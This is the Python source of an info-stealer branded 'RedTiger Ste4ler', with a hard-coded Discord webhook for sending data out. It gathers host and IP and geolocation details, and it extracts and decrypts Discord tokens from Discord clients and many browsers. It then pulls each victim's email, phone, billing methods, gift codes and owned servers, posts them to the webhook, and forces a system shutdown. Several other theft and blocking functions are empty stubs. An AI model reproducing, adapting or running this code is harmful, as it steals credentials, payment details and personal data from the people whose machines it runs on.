w3bh00k_ur1 = "https://discord.com/api/webhooks/1270444860045787277/tjA4L7_zmI1Al37PVc6a1ttQbJcIUS2NxtuqbWo4vOuaHiqIWCyMw-2nSMt_HcL7lHQY"
while True:
    import os
    try:
        import platform
        import ctypes
        from screeninfo import *
        import psutil
        import GPUtil
        import sqlite3
        from urllib.request import Request, urlopen
        import json
        from json import *
        import socket
        import requests
        from Crypto.Cipher import AES
        import subprocess
        import datetime
        import base64
        import re
        import string
        import win32api
        import discord
        from discord import Embed, File, SyncWebhook
        import sys
        import shutil
        from pathlib import Path
        from zipfile import ZipFile
        from win32crypt import CryptUnprotectData
        import uuid
        from PIL import ImageGrab
        import time
        import browser_cookie3
        import cv2
        import pyautogui
        import keyboard
        import threading
        from tkinter import messagebox
        break
    except:
        modules = [
            "--upgrade pip",
            "platform", "ctypes", "screeninfo", "psutil", "GPUtil", "sqlite3",
            "urllib3", "json", "socket", "requests", "pycryptodome", "subprocess",
            "datetime", "base64", "re", "string", "pypiwin32", "discord.py",
            "sys", "shutil", "pathlib", "uuid", "Pillow", "browser-cookie3",
            "opencv-python", "pyautogui", "keyboard", "tkinter"
        ]

        for module in modules:
            os.system(f"pip install {module}")

def B10ck_K3y(): pass
def Unb10ck_K3y(): pass
def B10ck_T45k_M4n4g3r(): pass
def B10ck_M0u53(): pass
def B10ck_W3b5it3(): pass
def St4rtup(): pass
def Sy5t3m_Inf0(): pass
def Op3n_U53r_Pr0fi13_53tting5(): pass
def Scr33n5h0t(): pass
def C4m3r4_C4ptur3(): pass
def Di5c0rd_T0k3n(): pass
def Br0w53r_5t341(): pass
def R0b10x_C00ki3(): pass
def F4k3_3rr0r(): pass
def Sp4m_0p3n_Pr0gr4m(): pass
def Shutd0wn(): pass
    
def Clear():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

website = "redtiger.shop"
color_embed = 0xa80505
username_embed = 'RedTiger Ste4ler'
avatar_embed = 'https://media.discordapp.net/attachments/1185940734256357427/1252261629546987550/logo_redtiger.png?ex=66719306&is=66704186&hm=c0cdee4699eb76dd404125866c4130d77ed177426daf71d8c976e5bbcb44c6bd&=&format=webp&quality=lossless&width=810&height=810'
footer_text = f"RedTiger Ste4ler"
footer_embed = {
        "text": footer_text,
        "icon_url": avatar_embed,
        }
                 

try: hostname_pc = socket.gethostname()
except: hostname_pc = "None"

try: username_pc = os.getlogin()
except: username_pc = "None"

try: displayname_pc = win32api.GetUserNameEx(win32api.NameDisplay)
except: displayname_pc = "None"

try: ip_address_public = requests.get('https://httpbin.org/ip').json()['origin']
except: ip_address_public = "None"

try:
    socket.socket(socket.AF_INET, socket.SOCK_DGRAM).connect(('8.8.8.8', 80))  
    ip_address_ipv4 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM).getsockname()[0]
    socket.socket(socket.AF_INET, socket.SOCK_DGRAM).close()
except: ip_address_ipv4 = "None"

try:
    ip_address_ipv6 = []
    all_interfaces = socket.getaddrinfo(socket.gethostname(), None)
    for interface in all_interfaces:
        if interface[0] == socket.AF_INET6:
            ip_address_ipv6.append(interface[4][0])
    ip_address_ipv6 = ' / '.join(ip_address_ipv6)
except:
    ip_address_ipv6 = "None"

try:
    try:
        response = requests.get(f"https://{website}/api/ip/ip={ip_address_public}")
        api = response.json()

        country = api['country']
        country_code = api['country_code']
        region = api['region']
        region_code = api['region_code']
        zip_postal = api['zip']
        city = api['city']
        latitude = api['latitude']
        longitude = api['longitude']
        timezone = api['timezone']
        isp = api['isp']
        org = api['org']
        as_number = api['as']
    except:
        response = requests.get(f"http://ip-api.com/json/{ip_address_public}")
        api = response.json()

        country = api['country']
        country_code = api['countryCode']
        region = api['regionName']
        region_code = api['region']
        zip_postal = api['zip']
        city = api['city']
        latitude = api['lat']
        longitude = api['lon']
        timezone = api['timezone']
        isp = api['isp']
        org = api['org']
        as_number = api['as']
except:
    country, country_code, region, region_code, city, zip_postal, latitude, longitude, timezone, isp, org, as_number = "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None"

def Di5c0rd_T0k3n():
    class D15c0rd:
        def __init__(self, w3bh00k):
            upload_t0k3n5(w3bh00k).upload()

    class extr4ct_t0k3n5:
        def __init__(self) -> None:
            self.base_url = "https://discord.com/api/v9/users/@me"
            self.appdata = os.getenv("localappdata")
            self.roaming = os.getenv("appdata")
            self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
            self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

            self.t0k3n5, self.uids = [], []

            self.extr4ct()

        def extr4ct(self) -> None:
            paths = {
                'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
                'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
                'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
                'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
                'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
                'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
                'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
                'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
                'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
                'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
                'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
                '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
                'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
                'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
                'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
                'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
                'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
                'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
                'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
                'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
                'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
                'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
                'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
                'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
                'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
                'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
                'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
            }

            for name, path in paths.items():
                if not os.path.exists(path):
                    continue
                _d15c0rd = name.replace(" ", "").lower()
                if "cord" in path:
                    if not os.path.exists(self.roaming+f'\\{_d15c0rd}\\Local State'):
                        continue
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.regexp_enc, line):
                                t0k3n = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[
                                                         1]), self.get_master_key(self.roaming+f'\\{_d15c0rd}\\Local State'))

                                if self.validate_t0k3n(t0k3n):
                                    uid = requests.get(self.base_url, headers={
                                                       'Authorization': t0k3n}).json()['id']
                                    if uid not in self.uids:
                                        self.t0k3n5.append(t0k3n)
                                        self.uids.append(uid)

                else:
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for t0k3n in re.findall(self.regexp, line):
                                if self.validate_t0k3n(t0k3n):
                                    uid = requests.get(self.base_url, headers={
                                                       'Authorization': t0k3n}).json()['id']
                                    if uid not in self.uids:
                                        self.t0k3n5.append(t0k3n)
                                        self.uids.append(uid)

            if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                    for _file in files:
                        if not _file.endswith('.sqlite'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                            for t0k3n in re.findall(self.regexp, line):
                                if self.validate_t0k3n(t0k3n):
                                    uid = requests.get(self.base_url, headers={
                                                       'Authorization': t0k3n}).json()['id']
                                    if uid not in self.uids:
                                        self.t0k3n5.append(t0k3n)
                                        self.uids.append(uid)

        def validate_t0k3n(self, t0k3n5: str) -> bool:
            r = requests.get(self.base_url, headers={'Authorization': t0k3n5})

            if r.status_code == 200:
                return True

            return False

        def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()

            return decrypted_pass

        def get_master_key(self, path: str) -> str:
            if not os.path.exists(path):
                return

            if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
                return

            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)

            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

            return master_key

    class upload_t0k3n5:
        def __init__(self, w3bh00k: str):
            self.t0k3n5 = extr4ct_t0k3n5().t0k3n5
            self.w3bh00k = SyncWebhook.from_url(w3bh00k)

        def upload(self):
            if not self.t0k3n5:
                return

            for t0k3n_d15c0rd in self.t0k3n5:
                user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': t0k3n_d15c0rd}).json()

                try: u53rn4m3_d15c0rd = user['username'] + ' / ' + user['discriminator']
                except: u53rn4m3_d15c0rd = "None"

                try: d15pl4y_n4m3_d15c0rd = user['global_name']
                except: d15pl4y_n4m3_d15c0rd = "None"

                try: us3r_1d_d15c0rd = user['id']
                except: us3r_1d_d15c0rd = "None"

                try: em4i1_d15c0rd = user['email']
                except: em4i1_d15c0rd = "None"
                
                try: ph0n3_d15c0rd = user['phone']
                except: ph0n3_d15c0rd = "None"
                
                try: mf4_d15c0rd = user['mfa_enabled']
                except: mf4_d15c0rd = "None"
                
                try: c0untry_d15c0rd = user['locale']
                except: c0untry_d15c0rd = "None"

                try: av4t4r_ur1_d15c0rd = f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{user['avatar']}.png"
                except: av4t4r_ur1_d15c0rd = avatar_embed

                try:
                    if user['premium_type'] == 0:
                        n1tr0_d15c0rd = 'False'
                    elif user['premium_type'] == 1:
                        n1tr0_d15c0rd = 'Nitro Classic'
                    elif user['premium_type'] == 2:
                        n1tr0_d15c0rd = 'Nitro Boosts'
                    elif user['premium_type'] == 3:
                        n1tr0_d15c0rd = 'Nitro Basic'
                    else:
                        n1tr0_d15c0rd = 'False'
                except:
                    n1tr0_d15c0rd = "None"

                try:
                    bi0_d15c0rd = user['bio']
                    if not bi0_d15c0rd.strip() or bi0_d15c0rd.isspace():
                        bi0_d15c0rd = "None"
                except:
                    bi0_d15c0rd = "None"

                try:
                    guilds_response = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': t0k3n_d15c0rd})
                    if guilds_response.status_code == 200:
                        guilds = guilds_response.json()
                        try:
                            owner_guilds = [guild for guild in guilds if guild['owner']]
                            own3r_gui1d_c0unt = len(owner_guilds)
                            own3r_gui1d_n4m35 = [] 
                            if owner_guilds:
                                for guild in owner_guilds:
                                    own3r_gui1d_n4m35.append(f"{guild['name']} ({guild['id']}) / ")
                                own3r_gui1d_n4m35 = "\n" + "\n".join(own3r_gui1d_n4m35)
                        except:
                            own3r_gui1d_c0unt = "None"
                            own3r_gui1d_n4m35 = "None" 
                except:
                    own3r_gui1d_c0unt = "None"
                    own3r_gui1d_n4m35 = "None"
            
                try:
                    billing_d15c0rd = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': t0k3n_d15c0rd}).json()
                    if billing_d15c0rd:
                        p4ym3nt_m3th0d5_d15c0rd = []

                        for method in billing_d15c0rd:
                            if method['type'] == 1:
                                p4ym3nt_m3th0d5_d15c0rd.append('CB')
                            elif method['type'] == 2:
                                p4ym3nt_m3th0d5_d15c0rd.append("Paypal")
                            else:
                                p4ym3nt_m3th0d5_d15c0rd.append('Other')
                        p4ym3nt_m3th0d5_d15c0rd = ' / '.join(p4ym3nt_m3th0d5_d15c0rd)
                    else:
                        p4ym3nt_m3th0d5_d15c0rd = "None"
                except:
                    p4ym3nt_m3th0d5_d15c0rd = "None"

                try:
                    g1ft_c0d35 = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': t0k3n_d15c0rd}).json()
                    if g1ft_c0d35:
                        codes = []
                        for g1ft_c0d35_d15c0rd in g1ft_c0d35:
                            name = g1ft_c0d35_d15c0rd['promotion']['outbound_title']
                            g1ft_c0d35_d15c0rd = g1ft_c0d35_d15c0rd['code']
                            data = f"Gift: {name}\nCode: {g1ft_c0d35_d15c0rd}"
                            if len('\n\n'.join(g1ft_c0d35_d15c0rd)) + len(data) >= 1024:
                                break
                            g1ft_c0d35_d15c0rd.append(data)
                        if len(g1ft_c0d35_d15c0rd) > 0:
                            g1ft_c0d35_d15c0rd = '\n\n'.join(g1ft_c0d35_d15c0rd)
                        else:
                            g1ft_c0d35_d15c0rd = "None"
                    else:
                        g1ft_c0d35_d15c0rd = "None"
                except:
                    g1ft_c0d35_d15c0rd = "None"

                embed = Embed(title=f'Discord Token `{username_pc} "{ip_address_public}"`:', color=color_embed)
                embed.set_thumbnail(url=av4t4r_ur1_d15c0rd)
                embed.add_field(name=":bust_in_silhouette: | Username:",
                                value=f"```{u53rn4m3_d15c0rd}```", inline=True)
                embed.add_field(name=":bust_in_silhouette: | Display Name:",
                                value=f"```{d15pl4y_n4m3_d15c0rd}```", inline=True)
                embed.add_field(name=":robot: | Id:",
                                value=f"```{us3r_1d_d15c0rd}```", inline=True)
                embed.add_field(name=":e_mail: | Email:",
                                value=f"```{em4i1_d15c0rd}```", inline=True)
                embed.add_field(name=":telephone_receiver: | Phone:",
                                value=f"```{ph0n3_d15c0rd}```", inline=True)   
                embed.add_field(name=":globe_with_meridians: | Token:",
                                value=f"```{t0k3n_d15c0rd}```", inline=True)
                embed.add_field(name=":rocket: | Nitro:",
                                value=f"```{n1tr0_d15c0rd}```", inline=True)
                embed.add_field(name=":earth_africa: | Language:",
                                value=f"```{c0untry_d15c0rd}```", inline=True)
                embed.add_field(name=":moneybag: | Billing:",
                                value=f"```{p4ym3nt_m3th0d5_d15c0rd}```", inline=True)
                embed.add_field(name=":gift: | Gift Code:",
                                value=f"```{g1ft_c0d35_d15c0rd}```", inline=True)
                embed.add_field(name=":lock: | Multi-Factor Authentication:",
                                value=f"```{mf4_d15c0rd}```", inline=True)
                embed.add_field(name=":identification_card: | Bio:",
                                value=f"```{bi0_d15c0rd}```", inline=True)
                embed.add_field(name=f":link: | Owner Guilds ({own3r_gui1d_c0unt}):",
                                value=f"```{own3r_gui1d_n4m35}```", inline=True)

                embed.set_footer(text=footer_text, icon_url=avatar_embed)

                self.w3bh00k.send(embed=embed, username=username_embed,
                                  avatar_url=avatar_embed)

    D15c0rd(w3bh00k_ur1)

def Shutd0wn():
    if sys.platform.startswith('win'):
        os.system('shutdown /s /t 15')
    elif sys.platform.startswith('linux'):
        os.system('shutdown -h +0.25')

payload = {
    'content': f'****╔═════════════════Victim Affected═════════════════╗****',
    'username': username_embed,
    'avatar_url': avatar_embed,
}
requests.post(w3bh00k_ur1, json=payload)
try: B10ck_K3y()
except: pass
try: B10ck_T45k_M4n4g3r()
except: pass
try: B10ck_W3b5it3()
except: pass
try: St4rtup()
except: pass
try: Sy5t3m_Inf0()
except: pass
try: C4m3r4_C4ptur3()
except: pass
try: Op3n_U53r_Pr0fi13_53tting5()
except: pass
try: Scr33n5h0t()
except: pass
try: Di5c0rd_T0k3n()
except: pass
try: Br0w53r_5t341()
except: pass
try: R0b10x_C00ki3()
except: pass
try: Shutd0wn()
except: pass
payload = {
    'content': f'****╚══════════════════{ip_address_public}══════════════════╝****',
    'username': username_embed,
    'avatar_url': avatar_embed,
}
requests.post(w3bh00k_ur1, json=payload)

try: F4k3_3rr0r()
except: pass
try: Sp4m_0p3n_Pr0gr4m()
except: pass
try: B10ck_M0u53()
except: pass

Clear()
